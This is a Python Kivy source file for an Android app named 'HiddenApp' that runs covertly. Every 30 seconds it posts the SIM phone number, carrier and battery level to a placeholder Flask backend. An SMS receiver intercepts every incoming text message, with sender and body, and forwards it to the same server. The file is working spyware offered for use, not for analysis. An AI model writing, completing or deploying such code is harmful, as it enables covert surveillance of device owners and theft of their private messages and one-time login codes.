from kivy.app import App
from kivy.uix.widget import Widget
from kivy.clock import Clock
from kivy.utils import platform
import requests

if platform == 'android':
    from jnius import autoclass
    from plyer import battery

    TelephonyManager = autoclass('android.telephony.TelephonyManager')
    Context = autoclass('android.content.Context')
    IntentFilter = autoclass('android.content.IntentFilter')
    BatteryManager = autoclass('android.os.BatteryManager')
    PythonActivity = autoclass('org.kivy.android.PythonActivity')
    BroadcastReceiver = autoclass('android.content.BroadcastReceiver')


class HiddenApp(Widget):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.backend_url = "https://your-flask-backend.com/api/data"  # Replace with your actual backend URL

        if platform == 'android':
            self.context = PythonActivity.mActivity.getApplicationContext()
            self.telephony_manager = self.context.getSystemService(Context.TELEPHONY_SERVICE)

        Clock.schedule_interval(self.send_device_data, 30)  # Send data every 30 seconds

    def get_sim_info(self):
        """Fetch SIM details like phone number and operator name."""
        if platform == 'android':
            try:
                phone_number = self.telephony_manager.getLine1Number()
                operator = self.telephony_manager.getNetworkOperatorName()
                return {"phone_number": phone_number, "operator": operator}
            except Exception as e:
                return {"error": str(e)}
        return {}

    def get_battery_status(self):
        """Fetch battery percentage."""
        if platform == 'android':
            return {"battery": battery.status['percentage']}
        return {}

    def send_device_data(self, dt):
        """Send SIM and battery data to Flask backend."""
        data = {
            "sim_info": self.get_sim_info(),
            "battery_status": self.get_battery_status()
        }
        try:
            response = requests.post(self.backend_url, json=data)
            print("Data sent:", response.status_code)
        except Exception as e:
            print("Error sending data:", e)


class SmsReceiver(BroadcastReceiver):
    def onReceive(self, context, intent):
        """Receive SMS and send it to backend."""
        if intent.getAction() == "android.provider.Telephony.SMS_RECEIVED":
            sms_messages = intent.getExtras().get("pdus")
            messages = []
            for pdu in sms_messages:
                SmsMessage = autoclass('android.telephony.SmsMessage')
                msg = SmsMessage.createFromPdu(pdu)
                messages.append({"sender": msg.getOriginatingAddress(), "body": msg.getMessageBody()})
            
            self.send_sms_to_backend(messages)

    def send_sms_to_backend(self, messages):
        """Send received SMS to Flask backend."""
        data = {"sms": messages}
        try:
            response = requests.post("https://your-flask-backend.com/api/sms", json=data)
            print("SMS sent:", response.status_code)
        except Exception as e:
            print("Error sending SMS:", e)


class HiddenUserApp(App):
    def build(self):
        return HiddenApp()


if __name__ == "__main__":
    HiddenUserApp().run()
